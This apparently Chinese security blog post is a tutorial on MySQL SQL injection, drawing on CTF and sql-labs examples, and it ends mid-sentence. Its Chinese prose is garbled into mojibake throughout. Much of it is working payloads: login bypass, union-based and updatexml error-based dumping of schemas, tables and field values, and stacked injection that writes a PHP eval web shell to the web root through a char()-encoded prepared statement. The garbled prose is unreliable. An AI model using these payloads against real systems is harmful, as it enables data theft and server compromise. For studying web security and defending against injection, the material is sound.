        <content type="html"><![CDATA[<h1 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h1><p>Sqlæ³¨å…¥æ¼æ´æ˜¯æŒ‡æœåŠ¡å™¨åœ¨å¤„ç†Sqlè¯­å¥æ—¶<strong>é”™è¯¯åœ°æ‹¼æ¥ç”¨æˆ·æäº¤çš„å‚æ•°</strong>ï¼Œ<strong>æ‰“ç ´äº†åŸæœ‰çš„Sqlæ‰§è¡Œé€»è¾‘</strong>ï¼Œå¯¼è‡´æ”»å‡»è€…å¯éƒ¨åˆ†æˆ–å®Œå…¨<strong>æŒæ¡Sqlè¯­å¥æ‰§è¡Œæ•ˆæœ</strong>çš„ä¸€ç±»å®‰å…¨é—®é¢˜ã€‚</p><p>ç®€å•çš„ä¾‹å­</p><p>å‡è®¾åç«¯Sqlä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=&#x27;<span class="subst">$id</span>&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>ç”¨æˆ·æäº¤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and 1=1 #</span></span><br></pre></td></tr></table></figure><p>æ‹¼æ¥åçš„sqlè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br></pre></td></tr></table></figure><p><code>1&#39;</code>å°†ç¬¬ä¸€ä¸ª<code>&#39;</code>é—­åˆï¼Œ<code>#</code>å°†ç¬¬äºŒä¸ª<code>&#39;</code>æ³¨é‡Šæ‰ï¼Œæ‰€ä»¥è¦è¿›è¡Œæ³¨å…¥ï¼Œåªéœ€è¦å°†<code>and 1=1</code>éƒ¨åˆ†æ›¿æ¢ä¸ºå…¶ä»–sqlè¯­å¥å³å¯ã€‚</p><blockquote><p>å…¶å®åˆ†æ<code>sqlmap</code>çš„æ³¨å…¥ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ³¨å…¥è¯­å¥ç”±<code>prefix</code>ï¼Œ<code>payload</code>å’Œ<code>suffix</code>ç»„æˆ</p></blockquote><p>å›¾æ¥æº<a href="https://www.freebuf.com/column/161797.html">https://www.freebuf.com/column/161797.html</a></p><p><img src="/../images/image-20230522131723064.png" alt="image-20230522131723064"></p><h1 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h1><ul><li><p>è·å¾—æ•°æ®åº“ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ‰‹æœºå·ï¼Œèº«ä»½è¯ï¼Œé‚®ç®±ï¼Œå®¶åº­åœ°å€ç­‰</p></li><li><p>è·å¾—ç½‘ç«™åå°è´¦å·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸‡èƒ½å¯†ç ï¼Ÿï¼ˆè¿™å¹´å¤´è¿˜æœ‰å—ğŸ¤”ï¼Œè¿˜æ˜¯æœ‰çš„ã€‚ã€‚ï¼‰</span><br><span class="line">æ‹¿åˆ°å¯†ç ï¼Œé€šå¸¸éœ€è¦é€†å‘è§£å¯†æˆ–è€…å½©è™¹è¡¨ç ´è§£</span><br><span class="line">é€šè¿‡sqlè¯­å¥åˆ›å»ºåå°è´¦å·                    </span><br></pre></td></tr></table></figure></li><li><p>ä»»æ„è¯»å–æ–‡ä»¶</p></li><li><p>Getshell</p></li><li><p>ææƒ</p></li></ul><h1 id="å¦‚ä½•æŒ–æ˜"><a href="#å¦‚ä½•æŒ–æ˜" class="headerlink" title="å¦‚ä½•æŒ–æ˜"></a>å¦‚ä½•æŒ–æ˜</h1><p><strong>ä¸€åˆ‡ä¸æ•°æ®åº“æœ‰äº¤äº’çš„åœ°æ–¹</strong>éƒ½å¯èƒ½æ˜¯<strong>æ³¨å…¥ç‚¹</strong>ï¼Œå–å†³äºåç«¯ä»HTTPè¯·æ±‚æŠ¥æ–‡ä¸­æå–äº†ä»€ä¹ˆæ•°æ®å¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­</p><p><strong>æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</strong></p><p>åˆ¤æ–­é—­åˆç±»å‹ï¼Œé€šå¸¸ä½¿ç”¨æŠ¥é”™ï¼Œå¸ƒå°”ï¼Œå»¶æ—¶ï¼Œæ•°å­¦è¿ç®—ç­‰æ‰‹æ³•æ¥æ£€æµ‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">\</span><br><span class="line">+1ï¼Œ-1</span><br><span class="line">æŠ¥é”™å‡½æ•°</span><br><span class="line">å»¶æ—¶å‡½æ•°</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_39997096/article/details/109764488">å®æˆ˜ä¸­SQLæ³¨å…¥æœ€å®¹æ˜“å‡ºç°çš„åœ°æ–¹_åªæœ‰é€‰æ‹©æ¡†å’Œæ—¥æœŸæ¡†,ä¼šå‡ºç°sqlæ³¨å…¥æƒ…å†µå—-CSDNåšå®¢</a></p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p><img src="/../images/image-20230522131900429.png" alt="image-20230522131900429"></p><h3 id="ç«™åº“åˆ†ç¦»"><a href="#ç«™åº“åˆ†ç¦»" class="headerlink" title="ç«™åº“åˆ†ç¦»"></a>ç«™åº“åˆ†ç¦»</h3><blockquote><p>Webç«™ç‚¹å’Œæ•°æ®åº“ä¸åœ¨åŒä¸€ä¸ªä¸»æœºä¸Šï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡æ•°æ®åº“å¯¹Webç«™ç‚¹è¿›è¡Œè¯»å†™æ“ä½œ</p></blockquote><p><strong>æ”»å‡»æ‰‹æ³•</strong></p><ul><li>è¯»å–è´¦å¯†ï¼Œè½¬åˆ°webæœåŠ¡å™¨ä¸Šæ‰“</li><li>ä¿¡æ¯æ”¶é›†ï¼Œæ•°æ®åº“æœåŠ¡å™¨æ˜¯å¦åœ¨å†…ç½‘ä¸­</li></ul><p><strong>ç«™åº“åˆ†ç¦»çš„åˆ¤æ–­æ–¹æ³•</strong></p><ul><li><p>é€šç”¨æ–¹æ³•</p><p>è¯»å–é…ç½®æ–‡ä»¶ï¼Œåˆ¤æ–­IP</p></li><li><p>Mysql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@hostname; //æœåŠ¡ç«¯ä¸»æœºåç§° </span><br><span class="line">select * from information_schema.PROCESSLIST; //å®¢æˆ·ç«¯ä¸»æœºåç§°å’Œç«¯å£</span><br></pre></td></tr></table></figure><blockquote><p>Windowsè¿æ¥æ ¼å¼ï¼šä¸»æœºå:Port</p><p>Linuxè¿æ¥æ ¼å¼ï¼šIP:Port</p><p>æœ¬åœ°è¿æ¥æ ¼å¼ï¼šlocalhost:Port</p></blockquote><p><img src="/../images/image-20230522203905326.png" alt="image-20230522203905326"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user();</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœä¸æ˜¯localhostï¼Œå¤§æ¦‚ç‡æ˜¯ç«™åº“åˆ†ç¦»ã€‚</p></blockquote><p>  <img src="/../images/image-20230522204233420.png" alt="image-20230522204233420"></p></li></ul><h3 id="æ•°æ®åº“ç±»å‹"><a href="#æ•°æ®åº“ç±»å‹" class="headerlink" title="æ•°æ®åº“ç±»å‹"></a>æ•°æ®åº“ç±»å‹</h3><p><img src="/../images/image-20230519205623244-1685603526750.png"></p><h3 id="å„ç§ä¿¡æ¯"><a href="#å„ç§ä¿¡æ¯" class="headerlink" title="å„ç§ä¿¡æ¯"></a>å„ç§ä¿¡æ¯</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ifnull(@@secure_file_priv,0) secure_file_privä¸ºç©ºæ—¶è¿”å›0,ä¸ä¸ºç©ºæ—¶è¿”å›å…¶å€¼</span><br><span class="line">SELECT concat_ws(0x0a,</span><br><span class="line">ifnull(@@secure_file_priv,0),</span><br><span class="line">concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment),</span><br><span class="line">concat_ws(0xefbc8c, @@hostname, @@port),</span><br><span class="line">concat_ws(0xefbc8c, user(), database()),</span><br><span class="line">concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ç»“æœ</span><br><span class="line">0</span><br><span class="line">10.5.8-MariaDB-3ï¼Œdebian-linux-gnuï¼Œx86_64ï¼ŒDebian buildd-unstable</span><br><span class="line">kaliï¼Œ3306</span><br><span class="line">root@localhost</span><br><span class="line">/var/lib/mysql/ï¼Œ/usr/lib/mysql/plugin/ï¼Œ/tmpï¼Œ/usr</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¾—åˆ°åç«¯æ‰§è¡Œçš„sqlè¯­å¥</span><br><span class="line">select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE &#x27;%673245283%&#x27; LIMIT</span><br><span class="line"> 1),2,3;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210843123.png" alt="image-20230528210843123"></p><h2 id="Mysqlæ”»å‡»æ‰‹æ³•"><a href="#Mysqlæ”»å‡»æ‰‹æ³•" class="headerlink" title="Mysqlæ”»å‡»æ‰‹æ³•"></a>Mysqlæ”»å‡»æ‰‹æ³•</h2><h3 id="adminç™»å…¥"><a href="#adminç™»å…¥" class="headerlink" title="adminç™»å…¥"></a>adminç™»å…¥</h3><ul><li><p>ä¸‡èƒ½å¯†ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åç«¯ä»£ç Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¸ƒå°”è¿ç®—è®©whereæ’ä¸ºçœŸ</p><p><img src="/../images/image-20230312212035948.png" alt="image-20230312212035948"></p></li><li><p>æ³¨å†Œè¦†ç›–</p><blockquote><p>admin (æœ‰ä¸ªç©ºæ ¼)æˆ–è€… (æœ‰ä¸ªç©ºæ ¼)admin</p><p>åŸç†ï¼šç”¨æˆ·åå­—æ®µé•¿åº¦&gt;5ï¼Œæ‰€ä»¥å¯ä»¥æ·»åŠ ç©ºæ ¼ï¼Œè€Œsqlè¯­å¥æ‰§è¡Œæ—¶ä¼šå°†ç©ºæ ¼å¿½ç•¥ã€‚</p></blockquote><p><img src="/../images/image-20230312210909402.png" alt="image-20230312210909402"></p></li><li><p>è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ·</p><p><code>[GXYCTF2019]BabySQli</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åç«¯ä»£ç Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$passwords</span>=<span class="variable">$users</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)&lt;&gt;<span class="variable">$passwords</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; limit 1,2--+</span><br><span class="line"></span><br><span class="line">passwd=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line"></span><br><span class="line">MD5(1)=c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230312215147770.png" alt="image-20230312215147770"></p></li></ul><h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h3><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>sqlè¯­å¥ä¸º<code>select</code>,é¡µé¢æœ‰å›æ˜¾æŸ¥è¯¢ç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users where id=<span class="subst">$id</span> &quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><strong>å…ˆåˆ¤æ–­è¡¨ä¸­çš„åˆ—æ•°</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> x</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,null.....</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨nullæ˜¯å› ä¸ºéœ€è¦åŒ¹é…æ•°æ®æ ¼å¼ï¼Œè€Œnullæ˜¯å¯ä»¥åŒ¹é…ä»»æ„æ•°æ®æ ¼å¼çš„</p><p><strong>å†åˆ¤æ–­å“ªä¸€åˆ—æ˜¯è¾“å‡ºç‚¹</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¯ä¸ªä½ç½®è¾“å‡ºä¸åŒçš„å€¼æ¥åˆ¤æ–­</span><br></pre></td></tr></table></figure><p><strong>æœ€åè¿›è¡Œæ³¨å…¥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–åº“å</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–è¡¨å </span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;å·²çŸ¥åº“å&#x27;#</span><br><span class="line"></span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=&#x27;å·²çŸ¥åº“å&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–å­—æ®µå</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;å·²çŸ¥è¡¨å&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–å­—æ®µå€¼</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(å­—æ®µ1ï¼Œå­—æ®µ2...) from å·²çŸ¥è¡¨å#</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼š</p><p>å› ä¸ºåç«¯æŸ¥è¯¢è¯­å¥å¯èƒ½åªæ‹¿ç¬¬ä¸€è¡ŒæŸ¥è¯¢ç»“æœå¦‚<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>ï¼Œæ‰€ä»¥éœ€è¦æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„å€¼å¦‚-1ï¼Œä½¿å¾—è”åˆæŸ¥è¯¢çš„ç»“æœæˆä¸ºç¬¬ä¸€è¡Œï¼›</p><p>è¦æŸ¥çš„è¡¨çš„åç§°(è¿™ä¸ªè¡¨æ˜¯ä¸æ˜¯åœ¨ç°åœ¨ä½¿ç”¨çš„æ•°æ®åº“ä¸­ï¼Œæ²¡æœ‰çš„è¯è¡¨å&#x3D;æ•°æ®åº“.è¡¨å)</p></blockquote><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><h5 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h5><blockquote><p>åç«¯ä½¿ç”¨çš„æŸ¥è¯¢å‡½æ•°ä¸º<code>mysqli_multi_query()</code> ï¼Œæ”¯æŒå¤šæ¡è¯­å¥æŸ¥è¯¢</p><p>è€Œä¸æ˜¯<code>mysqli_query()</code> ï¼Œä»…æ”¯æŒä¸€æ¡è¯­å¥æŸ¥è¯¢</p></blockquote><h5 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h5><ul><li><p>å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“çš„å½±å“</p></li><li><p>æ— å›æ˜¾ï¼šåœ¨ Web ä¸­ä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥</p><p><strong>è§£å†³æ–¹æ³•</strong>ï¼šå¯ä»¥é€šè¿‡å…ˆå°†å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢æŸ¥å‡ºæ¥</p></li></ul><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;;sqlè¯­å¥;--+</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»»æ„æ‰§è¡Œsqlè¯­å¥ï¼Œå±å®³å¾ˆå¤§</p><h6 id="é…åˆhandleç»•è¿‡å…³é”®å­—"><a href="#é…åˆhandleç»•è¿‡å…³é”®å­—" class="headerlink" title="é…åˆhandleç»•è¿‡å…³é”®å­—"></a>é…åˆhandleç»•è¿‡å…³é”®å­—</h6><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">ã€MySQLã€‘MySQL ä¹‹ handler çš„è¯¦ç»†ä½¿ç”¨åŠè¯´æ˜</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler è¡¨å  open ; handler è¡¨å read first; #æ‰“å¼€è¡¨ï¼›è¯»å–ç¬¬ä¸€æ¡æ•°æ®</span><br><span class="line">handler è¡¨å read next;#ä¸ä¸Šä¸€æ¡è¯­å¥ä¸€èµ·ç”¨ï¼Œè¯»å–ä¸‹ä¸€æ¡å³ç¬¬äºŒæ¡æ•°æ®</span><br></pre></td></tr></table></figure><h6 id="é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡"><a href="#é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡" class="headerlink" title="é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡"></a>é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡</h6><p>ä½¿ç”¨æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @tn = &#x27;hahaha&#x27;;  //å­˜å‚¨è¡¨å</span><br><span class="line">set @sql = concat(&#x27;select * from &#x27;, @tn);  //å­˜å‚¨SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">prepare query from @sql;   //é¢„å®šä¹‰SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">execute query;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">(DEALLOCATE || DROP) prepare sqla;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥</span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p>[SUCTF 2018]MultiSQL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;;prepare name from @sql;execute name;</span><br></pre></td></tr></table></figure><p>è½¬æ¢è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;&quot;</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b.append(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">c=<span class="string">&#x27;,&#x27;</span>.join(b)</span><br><span class="line">res = <span class="string">&#x27;char(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(c)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query;</span><br></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><h5 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h5><p><strong>ä½¿ç”¨<code>mysql_error()</code>å‡½æ•°ï¼Œå¯ä»¥è¿”å›ä¸Šä¸€ä¸ªMysqlæ“ä½œäº§ç”Ÿçš„æ–‡æœ¬é”™è¯¯ä¿¡æ¯ã€‚</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;wrong_user&quot;</span>,<span class="string">&quot;wrong_pwd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;</span><br><span class="line">Access denied <span class="keyword">for</span> user <span class="string">&#x27;wrong_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">(using password: YES)</span><br></pre></td></tr></table></figure><h5 id="æŠ¥é”™å‡½æ•°"><a href="#æŠ¥é”™å‡½æ•°" class="headerlink" title="æŠ¥é”™å‡½æ•°"></a>æŠ¥é”™å‡½æ•°</h5><p>æœ€å¸¸ç”¨çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Xpatè¯­æ³•é”™è¯¯ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œæœ€å¤§é•¿åº¦é™åˆ¶32ä½,é…åˆsubstr()ç­‰æˆªå–å­—ç¬¦ä¸²å‡½æ•°ä½¿ç”¨</span><br><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523184243091.png" alt="image-20230523184243091"></p><p>å…¶ä»–<a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">MySQLæŠ¥é”™æ³¨å…¥ </a></p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸå‹ï¼š</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(),0x7e),1))--+</span><br><span class="line"></span><br><span class="line">çˆ†åº“:</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">çˆ†è¡¨ï¼š</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema=&#x27;å·²çŸ¥åº“å&#x27;)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">çˆ†åˆ—åï¼š</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">çˆ†å­—æ®µå€¼</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+</span><br></pre></td></tr></table></figure><h3 id="äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥</h3><p><strong>åŸç†</strong></p><p><img src="/../images/1.png" alt="ctf1"></p><p>å¸¸è§è½¬ä¹‰å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>()</span><br><span class="line"><span class="title function_ invoke__">mysql_escape_string</span>()</span><br></pre></td></tr></table></figure><p>ä»¥<code>sql-labs Less-24</code>ä¸ºä¾‹</p><p>åˆ›å»ºç”¨æˆ·</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸æ°å½“çš„å‡½æ•°<code>mysql_escape_string</code>ï¼ŒåŠŸèƒ½ä¸ºåœ¨ MySQL 